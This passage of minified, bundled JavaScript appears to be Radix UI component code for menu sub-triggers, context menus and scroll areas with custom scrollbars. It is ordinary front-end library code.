        children: jsxRuntimeExports.jsx(MenuItemImpl, {
            id: x.triggerId,
            "aria-haspopup": "menu",
            "aria-expanded": j.open,
            "aria-controls": x.contentId,
            "data-state": getOpenState(j.open),
            ..._,
            ref: composeRefs(M, x.onTriggerChange),
            onClick: K => {
                var Q;
                (Q = _.onClick) == null || Q.call(_, K),
                !(_.disabled || K.defaultPrevented) && (K.currentTarget.focus(),
                j.open || j.onOpenChange(!0))
            }
            ,
            onPointerMove: composeEventHandlers$1(_.onPointerMove, whenMouse(K => {
                w.onItemEnter(K),
                !K.defaultPrevented && !_.disabled && !j.open && !b.current && (w.onPointerGraceIntentChange(null),
                b.current = window.setTimeout( () => {
                    j.onOpenChange(!0),
                    V()
                }
                , 100))
            }
            )),
            onPointerLeave: composeEventHandlers$1(_.onPointerLeave, whenMouse(K => {
                var ee, ae;
                V();
                const Q = (ee = j.content) == null ? void 0 : ee.getBoundingClientRect();
                if (Q) {
                    const ne = (ae = j.content) == null ? void 0 : ae.dataset.side
                      , oe = ne === "right"
                      , ue = oe ? -5 : 5
                      , fe = Q[oe ? "left" : "right"]
                      , he = Q[oe ? "right" : "left"];
                    w.onPointerGraceIntentChange({
                        area: [{
                            x: K.clientX + ue,
                            y: K.clientY
                        }, {
                            x: fe,
                            y: Q.top
                        }, {
                            x: he,
                            y: Q.top
                        }, {
                            x: he,
                            y: Q.bottom
                        }, {
                            x: fe,
                            y: Q.bottom
                        }],
                        side: ne
                    }),
                    window.clearTimeout(X.current),
                    X.current = window.setTimeout( () => w.onPointerGraceIntentChange(null), 300)
                } else {
                    if (w.onTriggerLeave(K),
                    K.defaultPrevented)
                        return;
                    w.onPointerGraceIntentChange(null)
                }
            }
            )),
            onKeyDown: composeEventHandlers$1(_.onKeyDown, K => {
                var ee;
                const Q = w.searchRef.current !== "";
                _.disabled || Q && K.key === " " || SUB_OPEN_KEYS[O.dir].includes(K.key) && (j.onOpenChange(!0),
                (ee = j.content) == null || ee.focus(),
                K.preventDefault())
            }
            )
        })
    })
}
);
MenuSubTrigger.displayName = SUB_TRIGGER_NAME$1;
var SUB_CONTENT_NAME$1 = "MenuSubContent"
  , MenuSubContent = reactExports.forwardRef( (_, M) => {
    const j = usePortalContext$1(CONTENT_NAME$3, _.__scopeMenu)
      , {forceMount: O=j.forceMount, ...x} = _
      , w = useMenuContext(CONTENT_NAME$3, _.__scopeMenu)
      , b = useMenuRootContext(CONTENT_NAME$3, _.__scopeMenu)
      , X = useMenuSubContext(SUB_CONTENT_NAME$1, _.__scopeMenu)
      , Y = reactExports.useRef(null)
      , F = useComposedRefs(M, Y);
    return jsxRuntimeExports.jsx(Collection$1.Provider, {
        scope: _.__scopeMenu,
        children: jsxRuntimeExports.jsx(Presence, {
            present: O || w.open,
            children: jsxRuntimeExports.jsx(Collection$1.Slot, {
                scope: _.__scopeMenu,
                children: jsxRuntimeExports.jsx(MenuContentImpl, {
                    id: X.contentId,
                    "aria-labelledby": X.triggerId,
                    ...x,
                    ref: F,
                    align: "start",
                    side: b.dir === "rtl" ? "left" : "right",
                    disableOutsidePointerEvents: !1,
                    disableOutsideScroll: !1,
                    trapFocus: !1,
                    onOpenAutoFocus: V => {
                        var K;
                        b.isUsingKeyboardRef.current && ((K = Y.current) == null || K.focus()),
                        V.preventDefault()
                    }
                    ,
                    onCloseAutoFocus: V => V.preventDefault(),
                    onFocusOutside: composeEventHandlers$1(_.onFocusOutside, V => {
                        V.target !== X.trigger && w.onOpenChange(!1)
                    }
                    ),
                    onEscapeKeyDown: composeEventHandlers$1(_.onEscapeKeyDown, V => {
                        b.onClose(),
                        V.preventDefault()
                    }
                    ),
                    onKeyDown: composeEventHandlers$1(_.onKeyDown, V => {
                        var ee;
                        const K = V.currentTarget.contains(V.target)
                          , Q = SUB_CLOSE_KEYS[b.dir].includes(V.key);
                        K && Q && (w.onOpenChange(!1),
                        (ee = X.trigger) == null || ee.focus(),
                        V.preventDefault())
                    }
                    )
                })
            })
        })
    })
}
);
MenuSubContent.displayName = SUB_CONTENT_NAME$1;
function getOpenState(_) {
    return _ ? "open" : "closed"
}
function isIndeterminate(_) {
    return _ === "indeterminate"
}
function getCheckedState(_) {
    return isIndeterminate(_) ? "indeterminate" : _ ? "checked" : "unchecked"
}
function focusFirst(_) {
    const M = document.activeElement;
    for (const j of _)
        if (j === M || (j.focus(),
        document.activeElement !== M))
            return
}
function wrapArray$1(_, M) {
    return _.map( (j, O) => _[(M + O) % _.length])
}
function getNextMatch(_, M, j) {
    const x = M.length > 1 && Array.from(M).every(F => F === M[0]) ? M[0] : M
      , w = j ? _.indexOf(j) : -1;
    let b = wrapArray$1(_, Math.max(w, 0));
    x.length === 1 && (b = b.filter(F => F !== j));
    const Y = b.find(F => F.toLowerCase().startsWith(x.toLowerCase()));
    return Y !== j ? Y : void 0
}
function isPointInPolygon$1(_, M) {
    const {x: j, y: O} = _;
    let x = !1;
    for (let w = 0, b = M.length - 1; w < M.length; b = w++) {
        const X = M[w]
          , Y = M[b]
          , F = X.x
          , V = X.y
          , K = Y.x
          , Q = Y.y;
        V > O != Q > O && j < (K - F) * (O - V) / (Q - V) + F && (x = !x)
    }
    return x
}
function isPointerInGraceArea(_, M) {
    if (!M)
        return !1;
    const j = {
        x: _.clientX,
        y: _.clientY
    };
    return isPointInPolygon$1(j, M)
}
function whenMouse(_) {
    return M => M.pointerType === "mouse" ? _(M) : void 0
}
var Anchor2 = MenuAnchor
  , Portal$2 = MenuPortal
  , Content2$3 = MenuContent
  , Group$1 = MenuGroup
  , Label$1 = MenuLabel
  , Item2$1 = MenuItem
  , CheckboxItem = MenuCheckboxItem
  , RadioGroup = MenuRadioGroup
  , RadioItem = MenuRadioItem
  , ItemIndicator$1 = MenuItemIndicator
  , Separator$1 = MenuSeparator
  , Arrow2$1 = MenuArrow
  , SubTrigger = MenuSubTrigger
  , SubContent = MenuSubContent
  , CONTEXT_MENU_NAME = "ContextMenu"
  , [createContextMenuContext,createContextMenuScope] = createContextScope(CONTEXT_MENU_NAME, [createMenuScope])
  , useMenuScope = createMenuScope()
  , [ContextMenuProvider,useContextMenuContext] = createContextMenuContext(CONTEXT_MENU_NAME)
  , TRIGGER_NAME$2 = "ContextMenuTrigger"
  , ContextMenuTrigger = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, disabled: O=!1, ...x} = _
      , w = useContextMenuContext(TRIGGER_NAME$2, j)
      , b = useMenuScope(j)
      , X = reactExports.useRef({
        x: 0,
        y: 0
    })
      , Y = reactExports.useRef({
        getBoundingClientRect: () => DOMRect.fromRect({
            width: 0,
            height: 0,
            ...X.current
        })
    })
      , F = reactExports.useRef(0)
      , V = reactExports.useCallback( () => window.clearTimeout(F.current), [])
      , K = Q => {
        X.current = {
            x: Q.clientX,
            y: Q.clientY
        },
        w.onOpenChange(!0)
    }
    ;
    return reactExports.useEffect( () => V, [V]),
    reactExports.useEffect( () => void (O && V()), [O, V]),
    jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
        children: [jsxRuntimeExports.jsx(Anchor2, {
            ...b,
            virtualRef: Y
        }), jsxRuntimeExports.jsx(Primitive$1.span, {
            "data-state": w.open ? "open" : "closed",
            "data-disabled": O ? "" : void 0,
            ...x,
            ref: M,
            style: {
                WebkitTouchCallout: "none",
                ..._.style
            },
            onContextMenu: O ? _.onContextMenu : composeEventHandlers$1(_.onContextMenu, Q => {
                V(),
                K(Q),
                Q.preventDefault()
            }
            ),
            onPointerDown: O ? _.onPointerDown : composeEventHandlers$1(_.onPointerDown, whenTouchOrPen(Q => {
                V(),
                F.current = window.setTimeout( () => K(Q), 700)
            }
            )),
            onPointerMove: O ? _.onPointerMove : composeEventHandlers$1(_.onPointerMove, whenTouchOrPen(V)),
            onPointerCancel: O ? _.onPointerCancel : composeEventHandlers$1(_.onPointerCancel, whenTouchOrPen(V)),
            onPointerUp: O ? _.onPointerUp : composeEventHandlers$1(_.onPointerUp, whenTouchOrPen(V))
        })]
    })
}
);
ContextMenuTrigger.displayName = TRIGGER_NAME$2;
var PORTAL_NAME$2 = "ContextMenuPortal"
  , ContextMenuPortal = _ => {
    const {__scopeContextMenu: M, ...j} = _
      , O = useMenuScope(M);
    return jsxRuntimeExports.jsx(Portal$2, {
        ...O,
        ...j
    })
}
;
ContextMenuPortal.displayName = PORTAL_NAME$2;
var CONTENT_NAME$2 = "ContextMenuContent"
  , ContextMenuContent = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useContextMenuContext(CONTENT_NAME$2, j)
      , w = useMenuScope(j)
      , b = reactExports.useRef(!1);
    return jsxRuntimeExports.jsx(Content2$3, {
        ...w,
        ...O,
        ref: M,
        side: "right",
        sideOffset: 2,
        align: "start",
        onCloseAutoFocus: X => {
            var Y;
            (Y = _.onCloseAutoFocus) == null || Y.call(_, X),
            !X.defaultPrevented && b.current && X.preventDefault(),
            b.current = !1
        }
        ,
        onInteractOutside: X => {
            var Y;
            (Y = _.onInteractOutside) == null || Y.call(_, X),
            !X.defaultPrevented && !x.modal && (b.current = !0)
        }
        ,
        style: {
            ..._.style,
            "--radix-context-menu-content-transform-origin": "var(--radix-popper-transform-origin)",
            "--radix-context-menu-content-available-width": "var(--radix-popper-available-width)",
            "--radix-context-menu-content-available-height": "var(--radix-popper-available-height)",
            "--radix-context-menu-trigger-width": "var(--radix-popper-anchor-width)",
            "--radix-context-menu-trigger-height": "var(--radix-popper-anchor-height)"
        }
    })
}
);
ContextMenuContent.displayName = CONTENT_NAME$2;
var GROUP_NAME$1 = "ContextMenuGroup"
  , ContextMenuGroup = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(Group$1, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuGroup.displayName = GROUP_NAME$1;
var LABEL_NAME$1 = "ContextMenuLabel"
  , ContextMenuLabel = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(Label$1, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuLabel.displayName = LABEL_NAME$1;
var ITEM_NAME$1 = "ContextMenuItem"
  , ContextMenuItem = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(Item2$1, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuItem.displayName = ITEM_NAME$1;
var CHECKBOX_ITEM_NAME = "ContextMenuCheckboxItem"
  , ContextMenuCheckboxItem = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(CheckboxItem, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuCheckboxItem.displayName = CHECKBOX_ITEM_NAME;
var RADIO_GROUP_NAME = "ContextMenuRadioGroup"
  , ContextMenuRadioGroup = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(RadioGroup, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuRadioGroup.displayName = RADIO_GROUP_NAME;
var RADIO_ITEM_NAME = "ContextMenuRadioItem"
  , ContextMenuRadioItem = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(RadioItem, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuRadioItem.displayName = RADIO_ITEM_NAME;
var INDICATOR_NAME = "ContextMenuItemIndicator"
  , ContextMenuItemIndicator = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(ItemIndicator$1, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuItemIndicator.displayName = INDICATOR_NAME;
var SEPARATOR_NAME$1 = "ContextMenuSeparator"
  , ContextMenuSeparator = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(Separator$1, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuSeparator.displayName = SEPARATOR_NAME$1;
var ARROW_NAME$2 = "ContextMenuArrow"
  , ContextMenuArrow = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(Arrow2$1, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuArrow.displayName = ARROW_NAME$2;
var SUB_TRIGGER_NAME = "ContextMenuSubTrigger"
  , ContextMenuSubTrigger = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(SubTrigger, {
        ...x,
        ...O,
        ref: M
    })
}
);
ContextMenuSubTrigger.displayName = SUB_TRIGGER_NAME;
var SUB_CONTENT_NAME = "ContextMenuSubContent"
  , ContextMenuSubContent = reactExports.forwardRef( (_, M) => {
    const {__scopeContextMenu: j, ...O} = _
      , x = useMenuScope(j);
    return jsxRuntimeExports.jsx(SubContent, {
        ...x,
        ...O,
        ref: M,
        style: {
            ..._.style,
            "--radix-context-menu-content-transform-origin": "var(--radix-popper-transform-origin)",
            "--radix-context-menu-content-available-width": "var(--radix-popper-available-width)",
            "--radix-context-menu-content-available-height": "var(--radix-popper-available-height)",
            "--radix-context-menu-trigger-width": "var(--radix-popper-anchor-width)",
            "--radix-context-menu-trigger-height": "var(--radix-popper-anchor-height)"
        }
    })
}
);
ContextMenuSubContent.displayName = SUB_CONTENT_NAME;
function whenTouchOrPen(_) {
    return M => M.pointerType !== "mouse" ? _(M) : void 0
}
var Trigger$2 = ContextMenuTrigger
  , Portal2 = ContextMenuPortal
  , Content2$2 = ContextMenuContent
  , Group2 = ContextMenuGroup
  , Label2 = ContextMenuLabel
  , Item2 = ContextMenuItem
  , CheckboxItem2 = ContextMenuCheckboxItem
  , RadioGroup2 = ContextMenuRadioGroup
  , RadioItem2 = ContextMenuRadioItem
  , ItemIndicator2 = ContextMenuItemIndicator
  , Separator2 = ContextMenuSeparator
  , SubTrigger2 = ContextMenuSubTrigger
  , SubContent2 = ContextMenuSubContent;
function clamp(_, [M,j]) {
    return Math.min(j, Math.max(M, _))
}
function useStateMachine(_, M) {
    return reactExports.useReducer( (j, O) => M[j][O] ?? j, _)
}
var SCROLL_AREA_NAME = "ScrollArea"
  , [createScrollAreaContext,createScrollAreaScope] = createContextScope(SCROLL_AREA_NAME)
  , [ScrollAreaProvider,useScrollAreaContext] = createScrollAreaContext(SCROLL_AREA_NAME)
  , ScrollArea = reactExports.forwardRef( (_, M) => {
    const {__scopeScrollArea: j, type: O="hover", dir: x, scrollHideDelay: w=600, ...b} = _
      , [X,Y] = reactExports.useState(null)
      , [F,V] = reactExports.useState(null)
      , [K,Q] = reactExports.useState(null)
      , [ee,ae] = reactExports.useState(null)
      , [ne,oe] = reactExports.useState(null)
      , [ue,fe] = reactExports.useState(0)
      , [he,pe] = reactExports.useState(0)
      , [ye,be] = reactExports.useState(!1)
      , [xe,Ae] = reactExports.useState(!1)
      , Ee = useComposedRefs(M, ce => Y(ce))
      , Be = useDirection(x);
    return jsxRuntimeExports.jsx(ScrollAreaProvider, {
        scope: j,
        type: O,
        dir: Be,
        scrollHideDelay: w,
        scrollArea: X,
        viewport: F,
        onViewportChange: V,
        content: K,
        onContentChange: Q,
        scrollbarX: ee,
        onScrollbarXChange: ae,
        scrollbarXEnabled: ye,
        onScrollbarXEnabledChange: be,
        scrollbarY: ne,
        onScrollbarYChange: oe,
        scrollbarYEnabled: xe,
        onScrollbarYEnabledChange: Ae,
        onCornerWidthChange: fe,
        onCornerHeightChange: pe,
        children: jsxRuntimeExports.jsx(Primitive$1.div, {
            dir: Be,
            ...b,
            ref: Ee,
            style: {
                position: "relative",
                "--radix-scroll-area-corner-width": ue + "px",
                "--radix-scroll-area-corner-height": he + "px",
                ..._.style
            }
        })
    })
}
);
ScrollArea.displayName = SCROLL_AREA_NAME;
var VIEWPORT_NAME$1 = "ScrollAreaViewport"
  , ScrollAreaViewport = reactExports.forwardRef( (_, M) => {
    const {__scopeScrollArea: j, children: O, nonce: x, ...w} = _
      , b = useScrollAreaContext(VIEWPORT_NAME$1, j)
      , X = reactExports.useRef(null)
      , Y = useComposedRefs(M, X, b.onViewportChange);
    return jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, {
        children: [jsxRuntimeExports.jsx("style", {
            dangerouslySetInnerHTML: {
                __html: "[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}"
            },
            nonce: x
        }), jsxRuntimeExports.jsx(Primitive$1.div, {
            "data-radix-scroll-area-viewport": "",
            ...w,
            ref: Y,
            style: {
                overflowX: b.scrollbarXEnabled ? "scroll" : "hidden",
                overflowY: b.scrollbarYEnabled ? "scroll" : "hidden",
                ..._.style
            },
            children: jsxRuntimeExports.jsx("div", {
                ref: b.onContentChange,
                style: {
                    minWidth: "100%",
                    display: "table"
                },
                children: O
            })
        })]
    })
}
);
ScrollAreaViewport.displayName = VIEWPORT_NAME$1;
var SCROLLBAR_NAME = "ScrollAreaScrollbar"
  , ScrollAreaScrollbar = reactExports.forwardRef( (_, M) => {
    const {forceMount: j, ...O} = _
      , x = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , {onScrollbarXEnabledChange: w, onScrollbarYEnabledChange: b} = x
      , X = _.orientation === "horizontal";
    return reactExports.useEffect( () => (X ? w(!0) : b(!0),
    () => {
        X ? w(!1) : b(!1)
    }
    ), [X, w, b]),
    x.type === "hover" ? jsxRuntimeExports.jsx(ScrollAreaScrollbarHover, {
        ...O,
        ref: M,
        forceMount: j
    }) : x.type === "scroll" ? jsxRuntimeExports.jsx(ScrollAreaScrollbarScroll, {
        ...O,
        ref: M,
        forceMount: j
    }) : x.type === "auto" ? jsxRuntimeExports.jsx(ScrollAreaScrollbarAuto, {
        ...O,
        ref: M,
        forceMount: j
    }) : x.type === "always" ? jsxRuntimeExports.jsx(ScrollAreaScrollbarVisible, {
        ...O,
        ref: M
    }) : null
}
);
ScrollAreaScrollbar.displayName = SCROLLBAR_NAME;
var ScrollAreaScrollbarHover = reactExports.forwardRef( (_, M) => {
    const {forceMount: j, ...O} = _
      , x = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , [w,b] = reactExports.useState(!1);
    return reactExports.useEffect( () => {
        const X = x.scrollArea;
        let Y = 0;
        if (X) {
            const F = () => {
                window.clearTimeout(Y),
                b(!0)
            }
              , V = () => {
                Y = window.setTimeout( () => b(!1), x.scrollHideDelay)
            }
            ;
            return X.addEventListener("pointerenter", F),
            X.addEventListener("pointerleave", V),
            () => {
                window.clearTimeout(Y),
                X.removeEventListener("pointerenter", F),
                X.removeEventListener("pointerleave", V)
            }
        }
    }
    , [x.scrollArea, x.scrollHideDelay]),
    jsxRuntimeExports.jsx(Presence, {
        present: j || w,
        children: jsxRuntimeExports.jsx(ScrollAreaScrollbarAuto, {
            "data-state": w ? "visible" : "hidden",
            ...O,
            ref: M
        })
    })
}
)
  , ScrollAreaScrollbarScroll = reactExports.forwardRef( (_, M) => {
    const {forceMount: j, ...O} = _
      , x = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , w = _.orientation === "horizontal"
      , b = useDebounceCallback( () => Y("SCROLL_END"), 100)
      , [X,Y] = useStateMachine("hidden", {
        hidden: {
            SCROLL: "scrolling"
        },
        scrolling: {
            SCROLL_END: "idle",
            POINTER_ENTER: "interacting"
        },
        interacting: {
            SCROLL: "interacting",
            POINTER_LEAVE: "idle"
        },
        idle: {
            HIDE: "hidden",
            SCROLL: "scrolling",
            POINTER_ENTER: "interacting"
        }
    });
    return reactExports.useEffect( () => {
        if (X === "idle") {
            const F = window.setTimeout( () => Y("HIDE"), x.scrollHideDelay);
            return () => window.clearTimeout(F)
        }
    }
    , [X, x.scrollHideDelay, Y]),
    reactExports.useEffect( () => {
        const F = x.viewport
          , V = w ? "scrollLeft" : "scrollTop";
        if (F) {
            let K = F[V];
            const Q = () => {
                const ee = F[V];
                K !== ee && (Y("SCROLL"),
                b()),
                K = ee
            }
            ;
            return F.addEventListener("scroll", Q),
            () => F.removeEventListener("scroll", Q)
        }
    }
    , [x.viewport, w, Y, b]),
    jsxRuntimeExports.jsx(Presence, {
        present: j || X !== "hidden",
        children: jsxRuntimeExports.jsx(ScrollAreaScrollbarVisible, {
            "data-state": X === "hidden" ? "hidden" : "visible",
            ...O,
            ref: M,
            onPointerEnter: composeEventHandlers$1(_.onPointerEnter, () => Y("POINTER_ENTER")),
            onPointerLeave: composeEventHandlers$1(_.onPointerLeave, () => Y("POINTER_LEAVE"))
        })
    })
}
)
  , ScrollAreaScrollbarAuto = reactExports.forwardRef( (_, M) => {
    const j = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , {forceMount: O, ...x} = _
      , [w,b] = reactExports.useState(!1)
      , X = _.orientation === "horizontal"
      , Y = useDebounceCallback( () => {
        if (j.viewport) {
            const F = j.viewport.offsetWidth < j.viewport.scrollWidth
              , V = j.viewport.offsetHeight < j.viewport.scrollHeight;
            b(X ? F : V)
        }
    }
    , 10);
    return useResizeObserver(j.viewport, Y),
    useResizeObserver(j.content, Y),
    jsxRuntimeExports.jsx(Presence, {
        present: O || w,
        children: jsxRuntimeExports.jsx(ScrollAreaScrollbarVisible, {
            "data-state": w ? "visible" : "hidden",
            ...x,
            ref: M
        })
    })
}
)
  , ScrollAreaScrollbarVisible = reactExports.forwardRef( (_, M) => {
    const {orientation: j="vertical", ...O} = _
      , x = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , w = reactExports.useRef(null)
      , b = reactExports.useRef(0)
      , [X,Y] = reactExports.useState({
        content: 0,
        viewport: 0,
        scrollbar: {
            size: 0,
            paddingStart: 0,
            paddingEnd: 0
        }
    })
      , F = getThumbRatio(X.viewport, X.content)
      , V = {
        ...O,
        sizes: X,
        onSizesChange: Y,
        hasThumb: F > 0 && F < 1,
        onThumbChange: Q => w.current = Q,
        onThumbPointerUp: () => b.current = 0,
        onThumbPointerDown: Q => b.current = Q
    };
    function K(Q, ee) {
        return getScrollPositionFromPointer(Q, b.current, X, ee)
    }
    return j === "horizontal" ? jsxRuntimeExports.jsx(ScrollAreaScrollbarX, {
        ...V,
        ref: M,
        onThumbPositionChange: () => {
            if (x.viewport && w.current) {
                const Q = x.viewport.scrollLeft
                  , ee = getThumbOffsetFromScroll(Q, X, x.dir);
                w.current.style.transform = `translate3d(${ee}px, 0, 0)`
            }
        }
        ,
        onWheelScroll: Q => {
            x.viewport && (x.viewport.scrollLeft = Q)
        }
        ,
        onDragScroll: Q => {
            x.viewport && (x.viewport.scrollLeft = K(Q, x.dir))
        }
    }) : j === "vertical" ? jsxRuntimeExports.jsx(ScrollAreaScrollbarY, {
        ...V,
        ref: M,
        onThumbPositionChange: () => {
            if (x.viewport && w.current) {
                const Q = x.viewport.scrollTop
                  , ee = getThumbOffsetFromScroll(Q, X);
                w.current.style.transform = `translate3d(0, ${ee}px, 0)`
            }
        }
        ,
        onWheelScroll: Q => {
            x.viewport && (x.viewport.scrollTop = Q)
        }
        ,
        onDragScroll: Q => {
            x.viewport && (x.viewport.scrollTop = K(Q))
        }
    }) : null
}
)
  , ScrollAreaScrollbarX = reactExports.forwardRef( (_, M) => {
    const {sizes: j, onSizesChange: O, ...x} = _
      , w = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , [b,X] = reactExports.useState()
      , Y = reactExports.useRef(null)
      , F = useComposedRefs(M, Y, w.onScrollbarXChange);
    return reactExports.useEffect( () => {
        Y.current && X(getComputedStyle(Y.current))
    }
    , [Y]),
    jsxRuntimeExports.jsx(ScrollAreaScrollbarImpl, {
        "data-orientation": "horizontal",
        ...x,
        ref: F,
        sizes: j,
        style: {
            bottom: 0,
            left: w.dir === "rtl" ? "var(--radix-scroll-area-corner-width)" : 0,
            right: w.dir === "ltr" ? "var(--radix-scroll-area-corner-width)" : 0,
            "--radix-scroll-area-thumb-width": getThumbSize(j) + "px",
            ..._.style
        },
        onThumbPointerDown: V => _.onThumbPointerDown(V.x),
        onDragScroll: V => _.onDragScroll(V.x),
        onWheelScroll: (V, K) => {
            if (w.viewport) {
                const Q = w.viewport.scrollLeft + V.deltaX;
                _.onWheelScroll(Q),
                isScrollingWithinScrollbarBounds(Q, K) && V.preventDefault()
            }
        }
        ,
        onResize: () => {
            Y.current && w.viewport && b && O({
                content: w.viewport.scrollWidth,
                viewport: w.viewport.offsetWidth,
                scrollbar: {
                    size: Y.current.clientWidth,
                    paddingStart: toInt(b.paddingLeft),
                    paddingEnd: toInt(b.paddingRight)
                }
            })
        }
    })
}
)
  , ScrollAreaScrollbarY = reactExports.forwardRef( (_, M) => {
    const {sizes: j, onSizesChange: O, ...x} = _
      , w = useScrollAreaContext(SCROLLBAR_NAME, _.__scopeScrollArea)
      , [b,X] = reactExports.useState()
      , Y = reactExports.useRef(null)
      , F = useComposedRefs(M, Y, w.onScrollbarYChange);
    return reactExports.useEffect( () => {
        Y.current && X(getComputedStyle(Y.current))
    }
    , [Y]),
    jsxRuntimeExports.jsx(ScrollAreaScrollbarImpl, {
        "data-orientation": "vertical",
        ...x,
        ref: F,
        sizes: j,
        style: {
            top: 0,
            right: w.dir === "ltr" ? 0 : void 0,
            left: w.dir === "rtl" ? 0 : void 0,
            bottom: "var(--radix-scroll-area-corner-height)",
            "--radix-scroll-area-thumb-height": getThumbSize(j) + "px",
            ..._.style
        },
        onThumbPointerDown: V => _.onThumbPointerDown(V.y),
        onDragScroll: V => _.onDragScroll(V.y),
        onWheelScroll: (V, K) => {
            if (w.viewport) {
                const Q = w.viewport.scrollTop + V.deltaY;
                _.onWheelScroll(Q),
                isScrollingWithinScrollbarBounds(Q, K) && V.preventDefault()
            }
        }
        ,
        onResize: () => {
            Y.current && w.viewport && b && O({
                content: w.viewport.scrollHeight,
                viewport: w.viewport.offsetHeight,
                scrollbar: {
                    size: Y.current.clientHeight,
                    paddingStart: toInt(b.paddingTop),
                    paddingEnd: toInt(b.paddingBottom)
                }
            })
        }
    })
}
)
  , [ScrollbarProvider,useScrollbarContext] = createScrollAreaContext(SCROLLBAR_NAME)
  , ScrollAreaScrollbarImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeScrollArea: j, sizes: O, hasThumb: x, onThumbChange: w, onThumbPointerUp: b, onThumbPointerDown: X, onThumbPositionChange: Y, onDragScroll: F, onWheelScroll: V, onResize: K, ...Q} = _
      , ee = useScrollAreaContext(SCROLLBAR_NAME, j)
      , [ae,ne] = reactExports.useState(null)
      , oe = useComposedRefs(M, Ee => ne(Ee))
      , ue = reactExports.useRef(null)
      , fe = reactExports.useRef("")
      , he = ee.viewport
      , pe = O.content - O.viewport
      , ye = useCallbackRef$1(V)
      , be = useCallbackRef$1(Y)
      , xe = useDebounceCallback(K, 10);
    function Ae(Ee) {
        if (ue.current) {
            const Be = Ee.clientX - ue.current.left
              , ce = Ee.clientY - ue.current.top;
            F({
                x: Be,
                y: ce
            })
        }
    }
    return reactExports.useEffect( () => {
        const Ee = Be => {
            const ce = Be.target;
            (ae == null ? void 0 : ae.contains(ce)) && ye(Be, pe)
        }
        ;
        return document.addEventListener("wheel", Ee, {
            passive: !1
        }),
        () => document.removeEventListener("wheel", Ee, {
            passive: !1
        })
    }
    , [he, ae, pe, ye]),
    reactExports.useEffect(be, [O, be]),
    useResizeObserver(ae, xe),
    useResizeObserver(ee.content, xe),
    jsxRuntimeExports.jsx(ScrollbarProvider, {
        scope: j,
        scrollbar: ae,
        hasThumb: x,
        onThumbChange: useCallbackRef$1(w),
        onThumbPointerUp: useCallbackRef$1(b),
        onThumbPositionChange: be,
        onThumbPointerDown: useCallbackRef$1(X),
        children: jsxRuntimeExports.jsx(Primitive$1.div, {
            ...Q,
            ref: oe,
            style: {
                position: "absolute",
                ...Q.style
            },
            onPointerDown: composeEventHandlers$1(_.onPointerDown, Ee => {
                Ee.button === 0 && (Ee.target.setPointerCapture(Ee.pointerId),
                ue.current = ae.getBoundingClientRect(),
                fe.current = document.body.style.webkitUserSelect,
                document.body.style.webkitUserSelect = "none",
                ee.viewport && (ee.viewport.style.scrollBehavior = "auto"),
                Ae(Ee))
            }
            ),
            onPointerMove: composeEventHandlers$1(_.onPointerMove, Ae),
            onPointerUp: composeEventHandlers$1(_.onPointerUp, Ee => {
                const Be = Ee.target;
                Be.hasPointerCapture(Ee.pointerId) && Be.releasePointerCapture(Ee.pointerId),
                document.body.style.webkitUserSelect = fe.current,
                ee.viewport && (ee.viewport.style.scrollBehavior = ""),
                ue.current = null
            }
            )
        })
    })
}
)
  , THUMB_NAME = "ScrollAreaThumb"
  , ScrollAreaThumb = reactExports.forwardRef( (_, M) => {
    const {forceMount: j, ...O} = _
      , x = useScrollbarContext(THUMB_NAME, _.__scopeScrollArea);
    return jsxRuntimeExports.jsx(Presence, {
        present: j || x.hasThumb,
        children: jsxRuntimeExports.jsx(ScrollAreaThumbImpl, {
            ref: M,
            ...O
        })
    })
}
)
  , ScrollAreaThumbImpl = reactExports.forwardRef( (_, M) => {
    const {__scopeScrollArea: j, style: O, ...x} = _
      , w = useScrollAreaContext(THUMB_NAME, j)
      , b = useScrollbarContext(THUMB_NAME, j)
